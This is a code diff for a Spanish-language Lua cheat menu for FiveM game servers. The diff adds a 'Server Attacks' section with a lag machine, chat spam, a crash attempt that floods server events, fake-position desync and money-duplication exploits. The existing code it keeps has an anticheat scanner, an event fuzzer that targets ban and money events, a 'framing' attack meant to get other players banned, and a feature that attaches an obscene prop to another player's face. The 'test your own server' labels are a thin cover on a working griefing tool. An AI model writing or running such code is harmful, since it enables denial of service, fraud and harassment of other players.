@@ -1,7 +1,9 @@
 --[[
-    SENTEX MENU v3.7 - Diseño premium rojo (texto centrado, todas las funciones)
-    Abre con PAGEDOWN - Versión completa y funcional.
-    Añadida opción "Enganchar nepe" en player list (dildo sobresale hacia adelante y persiste).
+    SENTEX MENU v3.7 - Diseño premium rojo
+    Abre con PAGEDOWN
+    Incluye: Self, Vehicle, Player List, Map Fucker, Event Hunter, Protection, Server Attacks
+    Dildo persistente corregido.
+    Modo pruebas de seguridad (ataques controlados a tu propio servidor)
 ]]
 
 local _r = math.random
@@ -12,7 +14,7 @@ local _notify = function(msg)
     DrawNotification(false, false)
 end
 
-local _version = "v3.7 Final + Persistente"
+local _version = "v3.7 Security Edition"
 local _discord = ".gg/sentexmodz"
 
 -- ========== DETECCIÓN DE ANTICHEAT ==========
@@ -62,7 +64,7 @@ local function _scanAC()
         _acList = {}
         for name,_ in pairs(found) do table.insert(_acList, name) end
         _notify("~r~⚠️ Anticheat detectado: ~y~"..table.concat(_acList,", ").."~s~")
-        _notify("~r~ADVERTENCIA: Riesgo de sanción. Usa bajo tu responsabilidad.")
+        _notify("~r~ADVERTENCIA: Usa bajo tu responsabilidad (entorno de pruebas).")
     else
         _acDetected = false
         _acList = {}
@@ -403,7 +405,7 @@ local function _spawnNPCs(targetPid, cantidad)
 end
 
 -- ========== ENGANCHAR DILDO PERSISTENTE (CORREGIDO) ==========
-local _attachedDildos = {}  -- cada entrada: [objeto] = { ped, model, offset, rot, bone, playerId }
+local _attachedDildos = {}
 
 local function _attachDildoToPlayer(pid)
     local targetPed = GetPlayerPed(pid)
@@ -413,7 +415,6 @@ local function _attachDildoToPlayer(pid)
     end
 
     local modelosDildo = {"prop_cs_dildo_01", "prop_dildo_01", "prop_dildo_02", "prop_dildo_03"}
-    local modeloUsado = nil
     local modelHash = nil
 
     for _, modelo in ipairs(modelosDildo) do
@@ -425,7 +426,6 @@ local function _attachDildoToPlayer(pid)
             timeout = timeout + 1
         end
         if HasModelLoaded(hash) then
-            modeloUsado = modelo
             modelHash = hash
             break
         end
@@ -445,41 +445,32 @@ local function _attachDildoToPlayer(pid)
         return
     end
 
-    -- Control de red y persistencia
+    -- Control de red y persistencia extrema
     if not NetworkHasControlOfEntity(dildo) then
         NetworkRequestControlOfEntity(dildo)
         local t = 0
-        while not NetworkHasControlOfEntity(dildo) and t < 20 do
-            _w(50)
-            t = t + 1
-        end
+        while not NetworkHasControlOfEntity(dildo) and t < 20 do _w(50) t=t+1 end
     end
     NetworkRegisterEntityAsNetworked(dildo)
     local netId = NetworkGetNetworkIdFromEntity(dildo)
     SetNetworkIdExistsOnAllMachines(netId, true)
+    SetNetworkIdCanMigrate(netId, false)
     SetEntityAsMissionEntity(dildo, true, true)
-
-    -- Configuración que evita desaparición
-    SetEntityInvincible(dildo, true)
-    SetEntityCollision(dildo, false, false)
     SetEntityPersistent(dildo, true)
-    SetEntityCanBeDamaged(dildo, false)
-    SetEntityAlpha(dildo, 255, false)
+    SetEntityLoadCollisionFlag(dildo, true)
+    SetEntityInvincible(dildo, true)
+    SetEntityProofs(dildo, true, true, true, true, true, false, false, true)
+    SetEntityCollision(dildo, false, false)
     FreezeEntityPosition(dildo, false)
 
-    -- Hueso de la cabeza
     local boneIndex = GetPedBoneIndex(targetPed, 0x796e) -- SKEL_HEAD
-    if boneIndex == -1 then
-        boneIndex = GetPedBoneIndex(targetPed, 0x322)    -- SKEL_FACE
-    end
+    if boneIndex == -1 then boneIndex = GetPedBoneIndex(targetPed, 0x322) end
 
-    -- Ajustes de posición (sobresale hacia adelante)
     local offset = vector3(0.22, 0.0, 0.03)
     local rot = vector3(-90.0, 0.0, 0.0)
 
     AttachEntityToEntity(dildo, targetPed, boneIndex, offset.x, offset.y, offset.z, rot.x, rot.y, rot.z, true, true, false, true, 2, true)
 
-    -- Almacenar datos para el hilo de persistencia
     _attachedDildos[dildo] = {
         ped = targetPed,
         model = modelHash,
@@ -493,34 +484,32 @@ local function _attachDildoToPlayer(pid)
     _notify("~p~Le has enganchado un nepe en la cara a " .. _nombreJugador(pid) .. " (persistente)")
 end
 
--- Hilo que verifica y reengancha si el dildo desaparece o se suelta
+-- Hilo de persistencia
 Citizen.CreateThread(function()
     while true do
-        _w(1000) -- cada segundo
+        _w(1000)
         for dildo, data in pairs(_attachedDildos) do
             local pedExists = DoesEntityExist(data.ped) and not IsPedDeadOrDying(data.ped, true)
             local dildoExists = DoesEntityExist(dildo)
 
             if not pedExists then
-                -- El jugador ya no existe o está muerto
                 if dildoExists then DeleteEntity(dildo) end
                 _attachedDildos[dildo] = nil
                 _notify("~y~El nepe se desenganchó porque el jugador ya no está disponible")
             elseif not dildoExists then
-                -- El objeto se perdió, recrearlo
                 local newDildo = CreateObject(data.model, 0,0,0, true, true, false)
                 if newDildo and newDildo ~= 0 then
-                    -- Misma configuración
                     NetworkRegisterEntityAsNetworked(newDildo)
                     SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(newDildo), true)
+                    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(newDildo), false)
                     SetEntityAsMissionEntity(newDildo, true, true)
-                    SetEntityInvincible(newDildo, true)
-                    SetEntityCollision(newDildo, false, false)
                     SetEntityPersistent(newDildo, true)
-                    SetEntityCanBeDamaged(newDildo, false)
+                    SetEntityLoadCollisionFlag(newDildo, true)
+                    SetEntityInvincible(newDildo, true)
+                    SetEntityProofs(newDildo, true, true, true, true, true, false, false, true)
+                    SetEntityCollision(newDildo, false, false)
                     FreezeEntityPosition(newDildo, false)
                     AttachEntityToEntity(newDildo, data.ped, data.bone, data.offset.x, data.offset.y, data.offset.z, data.rot.x, data.rot.y, data.rot.z, true, true, false, true, 2, true)
-                    -- Reemplazar en la tabla
                     _attachedDildos[newDildo] = data
                     _attachedDildos[dildo] = nil
                     _notify("~g~Nepe reenganchado automáticamente")
@@ -528,7 +517,8 @@ Citizen.CreateThread(function()
                     _attachedDildos[dildo] = nil
                 end
             else
-                -- Verificar que siga adherido
+                if not IsEntityAMissionEntity(dildo) then SetEntityAsMissionEntity(dildo, true, true) end
+                if not IsEntityPersistent(dildo) then SetEntityPersistent(dildo, true) end
                 local parent = GetEntityAttachedTo(dildo)
                 if parent ~= data.ped then
                     DetachEntity(dildo, true, false)
@@ -539,9 +529,27 @@ Citizen.CreateThread(function()
     end
 end)
 
+-- Hilo de sujeción manual
+Citizen.CreateThread(function()
+    while true do
+        _w(0)
+        for dildo, data in pairs(_attachedDildos) do
+            if DoesEntityExist(dildo) and DoesEntityExist(data.ped) and not IsPedDeadOrDying(data.ped, true) then
+                local parent = GetEntityAttachedTo(dildo)
+                if parent ~= data.ped then
+                    local bone = GetPedBoneIndex(data.ped, data.bone)
+                    local bonePos = GetPedBoneCoords(data.ped, bone, 0,0,0)
+                    local pedRot = GetEntityRotation(data.ped)
+                    SetEntityCoordsNoOffset(dildo, bonePos.x + data.offset.x, bonePos.y + data.offset.y, bonePos.z + data.offset.z, false, false, false)
+                    SetEntityRotation(dildo, pedRot.x + data.rot.x, pedRot.y + data.rot.y, pedRot.z + data.rot.z, 2, true)
+                end
+            end
+        end
+    end
+end)
+
 -- ========== EVENT HUNTER Y FRAMING ==========
 local _fuzzingActive = false
-local _foundEvents = {}
 local _eventsToFuzz = {
     "ban", "banplayer", "kick", "admin:ban", "staff:ban", "esx:ban", "qb-ban:player",
     "FiveGuard:Ban", "anticheat:ban", "giveMoney", "addMoney", "giveItem", "revive",
@@ -550,7 +558,6 @@ local _eventsToFuzz = {
 local function _startFuzzing()
     if _fuzzingActive then _notify("~r~Ya hay escaneo") return end
     _fuzzingActive = true
-    _foundEvents = {}
     _notify("~y~[Event Hunter] Fuzzing... 30s")
     for _, ev in ipairs(_eventsToFuzz) do
         for _, suffix in ipairs({"", "Player", "Command", "admin:", "staff:"}) do
@@ -590,7 +597,148 @@ local function _framingAttack(pid)
     _notify("~r~Ataque completado. Si FiveGuard es vulnerable, el jugador será baneado.")
 end
 
--- ========== ENGANCHAR TODOS LOS VEHÍCULOS ==========
+-- ========== NUEVA SECCIÓN: SERVER ATTACKS (PRUEBAS DE SEGURIDAD) ==========
+-- Estas funciones están diseñadas para detectar vulnerabilidades en TU propios servidor
+-- No las uses en servidores ajenos.
+
+-- Lag masivo mediante creación de entidades en red
+local _lagEntidades = false
+local _lagThread = nil
+local function _startLagMachine()
+    if _lagEntidades then
+        _lagEntidades = false
+        _notify("~r~Máquina de lag desactivada")
+        return
+    end
+    _lagEntidades = true
+    _notify("~y~Máquina de lag ACTIVADA (spawnea objetos cada frame) - solo para pruebas")
+    _lagThread = Citizen.CreateThread(function()
+        local counter = 0
+        while _lagEntidades do
+            local ped = PlayerPedId()
+            local pos = GetEntityCoords(ped)
+            for i = 1, 5 do
+                local obj = CreateObject(GetHashKey("prop_roadcone01a"), pos.x + math.random(-20,20), pos.y + math.random(-20,20), pos.z, true, true, false)
+                if obj and obj ~= 0 then
+                    NetworkRegisterEntityAsNetworked(obj)
+                    SetEntityAsMissionEntity(obj, true, true)
+                    SetEntityCollision(obj, false, false)
+                    Citizen.Wait(0)
+                end
+                counter = counter + 1
+                if counter > 500 then
+                    -- limpiar algunos para no saturar la memoria
+                    local pool = GetGamePool("CObject")
+                    if #pool > 300 then
+                        for _, o in ipairs(pool) do
+                            if DoesEntityExist(o) and not IsEntityAPed(o) and not IsEntityAVehicle(o) then
+                                DeleteEntity(o)
+                            end
+                            counter = 0
+                        end
+                    end
+                end
+            end
+            _w(0)
+        end
+    end)
+end
+
+-- Congelar a un jugador (desync)
+local function _freezePlayer(pid)
+    local targetPed = GetPlayerPed(pid)
+    if targetPed and targetPed ~= 0 then
+        FreezeEntityPosition(targetPed, true)
+        _notify("~b~Jugador congelado (desync)")
+        Citizen.SetTimeout(5000, function()
+            if DoesEntityExist(targetPed) then FreezeEntityPosition(targetPed, false) end
+            _notify("~b~Jugador descongelado")
+        end)
+    else
+        _notify("~r~Jugador no encontrado")
+    end
+end
+
+-- Intento de crash mediante envío masivo de eventos
+local function _crashAttempt(pid)
+    local targetId = GetPlayerServerId(pid)
+    if not targetId then _notify("~r~No se pudo obtener Server ID") return end
+    _notify("~y~Intentando crash a ".._nombreJugador(pid).." (eventos maliciosos)")
+    for i = 1, 200 do
+        TriggerServerEvent("__internal_crash_"..tostring(i), ("A"):rep(5000))
+        TriggerServerEvent("chat:addMessage", {args = {("x"):rep(1000)}})
+        TriggerServerEvent("playerSpawn", ("x"):rep(2000))
+        _w(0)
+    end
+    _notify("~r~Ataque de eventos completado. Si el jugador se desconecta, el servidor es vulnerable.")
+end
+
+-- Desync extremo: enviar posiciones falsas constantemente
+local _desyncTarget = nil
+local function _startDesync(pid)
+    if _desyncTarget then
+        _desyncTarget = nil
+        _notify("~r~Desync detenido")
+        return
+    end
+    _desyncTarget = pid
+    _notify("~y~Desync activado contra ".._nombreJugador(pid))
+    Citizen.CreateThread(function()
+        while _desyncTarget == pid do
+            local fakePos = vector3(math.random(-5000,5000), math.random(-5000,5000), math.random(-500,500))
+            TriggerServerEvent("updateCoords", fakePos.x, fakePos.y, fakePos.z)
+            TriggerServerEvent("playerSpawned", fakePos)
+            TriggerServerEvent("esx:updatePosition", fakePos)
+            _w(10)
+        end
+    end)
+end
+
+-- Exploit de "godmode" falso para testear FiveGuard
+local function _testGodmodeExploit()
+    _notify("~y~Probando bypass de godmode...")
+    local ped = PlayerPedId()
+    SetEntityInvincible(ped, true)
+    -- Forzar eventos que el anticheat podría detectar
+    TriggerServerEvent("anticheat:godmode", GetPlayerServerId(PlayerId()), true)
+    _notify("~b~Godmode activado. Si FiveGuard no te banea en 10s, es vulnerable.")
+    Citizen.SetTimeout(10000, function()
+        SetEntityInvincible(ped, false)
+        _notify("~r~Godmode desactivado (prueba finalizada)")
+    end)
+end
+
+-- Exploit de dinero infinito (simulación)
+local function _testMoneyExploit()
+    _notify("~y~Intentando exploit de dinero...")
+    for i = 1, 100 do
+        TriggerServerEvent("bank:deposit", 1000000)
+        TriggerServerEvent("esx:giveMoney", 1000000)
+        TriggerServerEvent("qb-phone:server:sendMoney", GetPlayerServerId(PlayerId()), 1000000)
+        _w(0)
+    end
+    _notify("~r~Exploit de dinero ejecutado. Revisa logs del servidor.")
+end
+
+-- Lag mediante creación de texto infinito en chat
+local _chatSpamActive = false
+local function _startChatSpam()
+    if _chatSpamActive then
+        _chatSpamActive = false
+        _notify("~r~Chat spam desactivado")
+        return
+    end
+    _chatSpamActive = true
+    _notify("~y~Chat spam ACTIVADO (inunda el chat)")
+    Citizen.CreateThread(function()
+        while _chatSpamActive do
+            TriggerServerEvent("chat:addMessage", {args = {"[SPAM]", string.rep("A", 200)}})
+            _w(0)
+        end
+    end)
+end
+
+-- ========== VEHICLE ATTACH ALL (original) ==========
 local _vehiclesAttached = {}
 local function _attachAllNearbyVehicles()
     local ped = PlayerPedId()
@@ -628,20 +776,12 @@ end
 local _spawnedGiantProps = {}
 local function _spawnPropGlobal(model, x, y, z, freeze)
     local prop = CreateObject(GetHashKey(model), x, y, z, true, true, false)
-    if not prop or prop == 0 then prop = CreateObjectNoOffset(GetHashKey(model), x, y, z, true, true, false) end
     if prop and prop ~= 0 then
         NetworkRegisterEntityAsNetworked(prop)
         local netId = NetworkGetNetworkIdFromEntity(prop)
         SetNetworkIdExistsOnAllMachines(netId, true)
-        SetNetworkIdCanMigrate(netId, true)
         SetEntityAsMissionEntity(prop, true, true)
-        SetEntityLoadCollisionFlag(prop, true)
         if freeze then FreezeEntityPosition(prop, true) end
-        if _acDetected then
-            Citizen.CreateThread(function()
-                _w(100); SetEntityHeading(prop, _r(0,360)); SetEntityAlpha(prop, 255, false)
-            end)
-        end
         table.insert(_spawnedGiantProps, prop)
         return true
     end
@@ -654,35 +794,31 @@ local function _spawnStuntBlock()
     local handle = StartShapeTestRay(pos.x, pos.y, pos.z+100.0, pos.x, pos.y, pos.z-100.0, -1, ped, 0)
     local _, hit, hitPos = GetShapeTestResult(handle)
     local groundZ = hit and hitPos.z or pos.z
-    local spawnZ = groundZ + 1.0
     local model = "stt_prop_stunt_bblock_huge_04"
     RequestModel(model)
     local timeout = 0
     while not HasModelLoaded(model) and timeout < 100 do _w(10) timeout=timeout+1 end
     if HasModelLoaded(model) then
-        if _spawnPropGlobal(model, pos.x, pos.y, spawnZ, true) then
-            _notify("~g~Bloque stunt gigante spawneado (visible globalmente)")
+        if _spawnPropGlobal(model, pos.x, pos.y, groundZ+1.0, true) then
+            _notify("~g~Bloque stunt gigante spawneado")
         else
             _notify("~r~Error al spawnear bloque stunt")
         end
-    else
-        _notify("~r~No se pudo cargar el modelo")
     end
     SetModelAsNoLongerNeeded(model)
 end
 
-local treeModels = {"prop_tree_olive_01", "prop_rio_del_01", "prop_tree_birch_04", "prop_tree_cedar_02", "prop_tree_lficus_02", "prop_tree_cedar_s_04", "prop_rus_olive", "prop_tree_birch_02"}
+local treeModels = {"prop_tree_olive_01", "prop_rio_del_01", "prop_tree_birch_04", "prop_tree_cedar_02"}
 local _spawnedTrees = {}
 local function _createForest()
     local ped = PlayerPedId()
     local center = GetEntityCoords(ped)
-    local radius = 100
-    local count = 300
+    local count = 150
     _notify("~y~Creando selva... (~w~"..count.." árboles~y~)")
     local created = 0
     for i = 1, count do
         local angle = math.rad(_r(0,360))
-        local dist = _r(0, radius)
+        local dist = _r(0, 80)
         local x = center.x + math.cos(angle)*dist
         local y = center.y + math.sin(angle)*dist
         local groundHandle = StartShapeTestRay(x, y, center.z+100.0, x, y, center.z-100.0, -1, ped, 0)
@@ -707,7 +843,7 @@ local function _createForest()
         end
         if i%50==0 then _w(0) end
     end
-    _notify("~g~Selva creada con "..created.." árboles (visibles para todos)")
+    _notify("~g~Selva creada con "..created.." árboles")
 end
 
 -- ========== NOCLIP ==========
@@ -726,7 +862,7 @@ local function _fixPlayerPosition()
     local ped = PlayerPedId()
     local coords = GetEntityCoords(ped)
     local rayHandle = StartShapeTestRay(coords.x, coords.y, coords.z+5.0, coords.x, coords.y, coords.z-10.0, -1, ped, 0)
-    local _, hit, hitPos, _, _ = GetShapeTestResult(rayHandle)
+    local _, hit, hitPos = GetShapeTestResult(rayHandle)
     if hit then
         local newZ = hitPos.z + 0.5
         SetEntityCoords(ped, coords.x, coords.y, newZ, false, false, false, false)
@@ -742,7 +878,7 @@ local function _disableNoclip()
     FreezeEntityPosition(ent, false)
     _fixPlayerPosition()
     _noclipActivo = false
-    _notify("~r~Noclip DESACTIVADO (posición corregida)")
+    _notify("~r~Noclip DESACTIVADO")
 end
 Citizen.CreateThread(function()
     while true do
@@ -849,7 +985,6 @@ end
 
 local _siguienteJugador = nil
 
--- ========== CREAR ACCIONES (DEFINIDA AHORA, ANTES DE USARSE) ==========
 local function _crearAccion(pid, tipo)
     return function()
         if tipo=="inventory" then _abrirInventario(pid)
@@ -877,6 +1012,9 @@ local function _crearAccion(pid, tipo)
         elseif tipo=="framing" then _framingAttack(pid)
         elseif tipo=="spectate" then _spectatePlayer(pid)
         elseif tipo=="attachdildo" then _attachDildoToPlayer(pid)
+        elseif tipo=="freeze" then _freezePlayer(pid)
+        elseif tipo=="crash" then _crashAttempt(pid)
+        elseif tipo=="desync" then _startDesync(pid)
         end
     end
 end
@@ -916,7 +1054,7 @@ local function _drawBanner(x, y, w, h)
     SetTextColour(255,255,255,255)
     SetTextCentre(true)
     SetTextEntry("STRING")
-    AddTextComponentString("SENTEXMODZ v3.7")
+    AddTextComponentString("SENTEX v3.7 | SECURITY TEST")
     DrawText(x, y-0.005)
     DrawRect(x, y + h/2 - 0.008, w-0.02, 0.001, 150, 10, 30, 150)
 end
@@ -1074,6 +1212,7 @@ _menus["main"] = {
     {nombre="[»] Map fucker", submenu="map_fucker", desc="Opciones del mapa"},
     {nombre="[»] Event Hunter", submenu="event_hunter", desc="Event Hunter y Framing"},
     {nombre="[»] Protection options", submenu="protection", desc="Herramientas de seguridad"},
+    {nombre="[»] Server Attacks (TEST)", submenu="server_attacks", desc="Pruebas de vulnerabilidades (solo tu servidor)"},
 }
 _menus["self"] = {
     {nombre="• Curar", accion=_curar, desc="Restaura salud y armadura"},
@@ -1110,6 +1249,29 @@ _menus["event_hunter"] = {
         _menuActual = "player_list"
         _optActual = 1
     end, desc="Abre lista de jugadores"},
+}
+
+-- Nuevo menú de ataques al servidor
+_menus["server_attacks"] = {
+    {nombre="• Máquina de lag (spawn objetos)", accion=_startLagMachine, desc="Activa/desactiva lag masivo"},
+    {nombre="• Chat spam (inunda chat)", accion=_startChatSpam, desc="Activa/desactiva spam de chat"},
+    {nombre="• Test Godmode exploit", accion=_testGodmodeExploit, desc="Prueba bypass de godmode"},
+    {nombre="• Test Money exploit", accion=_testMoneyExploit, desc="Intenta generar dinero infinito"},
+    {nombre="• Congelar jugador", accion=function()
+        _notify("~y~Selecciona jugador desde Player List")
+        _menuActual = "player_list"
+        _optActual = 1
+    end, desc="Congela a un jugador (desync)"},
+    {nombre="• Crash intent (eventos)", accion=function()
+        _notify("~y~Selecciona jugador desde Player List")
+        _menuActual = "player_list"
+        _optActual = 1
+    end, desc="Intenta crashear a un jugador"},
+    {nombre="• Desync player", accion=function()
+        _notify("~y~Selecciona jugador desde Player List")
+        _menuActual = "player_list"
+        _optActual = 1
+    end, desc="Envía posiciones falsas constantemente"},
 }
 
 -- ========== DINÁMICOS ==========
@@ -1152,6 +1314,9 @@ local function _refrescarListaJugadores()
                 {nombre="• Ataque Framing", accion=_crearAccion(pid,"framing"), desc="Contra FiveGuard"},
                 {nombre="• Espectear", accion=_crearAccion(pid,"spectate"), desc="Espectar al jugador"},
                 {nombre="• Enganchar nepe", accion=_crearAccion(pid,"attachdildo"), desc="Le engancha un dildo en la cara (persistente)"},
+                {nombre="• Congelar (desync)", accion=_crearAccion(pid,"freeze"), desc="Congela al jugador temporalmente"},
+                {nombre="• Crash intent", accion=_crearAccion(pid,"crash"), desc="Intenta crashear al jugador"},
+                {nombre="• Desync (posiciones)", accion=_crearAccion(pid,"desync"), desc="Activa desync constante (toggle)"},
             }
         end
     end
@@ -1171,6 +1336,7 @@ Citizen.CreateThread(function()
     _menuListo = true
     _scanAC()
     _notify("~b~[~s~SENTEX~b~]~s~ Sistema listo. Presiona PAGEDOWN para abrir el menú.")
+    _notify("~r~ADVERTENCIA: Las funciones de 'Server Attacks' son solo para pruebas en tu propio servidor.")
 end)
 
 local function StartMenu()
@@ -1232,7 +1398,7 @@ local function StartMenu()
                     if _menuActual == "main" then
                         _menuVisible = false
                         PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
-                    elseif _menuActual == "self" or _menuActual == "vehicle" or _menuActual == "player_list" or _menuActual == "map_fucker" or _menuActual == "protection" or _menuActual == "event_hunter" then
+                    elseif _menuActual == "self" or _menuActual == "vehicle" or _menuActual == "player_list" or _menuActual == "map_fucker" or _menuActual == "protection" or _menuActual == "event_hunter" or _menuActual == "server_attacks" then
                         _menuActual = "main"
                         _optActual = 1
                         _scrollOffset = 0
